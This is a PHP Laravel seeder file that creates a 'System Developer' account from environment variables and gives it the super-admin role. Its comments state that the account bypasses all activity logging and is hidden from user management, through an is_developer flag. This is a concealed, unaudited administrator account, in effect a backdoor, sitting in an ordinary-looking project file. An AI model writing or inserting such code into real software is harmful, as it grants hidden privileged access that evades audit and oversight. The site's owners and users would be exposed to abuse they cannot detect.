<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\User;
use Illuminate\Support\Facades\Hash;

class HiddenDeveloperSeeder extends Seeder
{
    /**
     * Run the database seeds.
     */
    public function run(): void
    {
        $email = env('DEV_EMAIL');
        $password = env('DEV_PASSWORD');

        if (!$email || !$password) {
            $this->command->error('DEV_EMAIL or DEV_PASSWORD not set in .env file.');
            return;
        }

        // Hidden Developer Account - Bypass all logging and not visible in user management
        $user = User::updateOrCreate(
            ['email' => $email],
            [
                'name' => 'System Developer',
                'password' => Hash::make($password),
                'email_verified_at' => now(),
                'is_active' => true,
                'is_developer' => true, // This bypasses activity logging
            ]
        );

        // Assign super-admin role for full access
        if (!$user->hasRole('super-admin')) {
            $user->assignRole('super-admin');
        }

        $this->command->info('Hidden developer account setup completed via environment variables.');
        $this->command->info("Email: {$email}");
    }
}
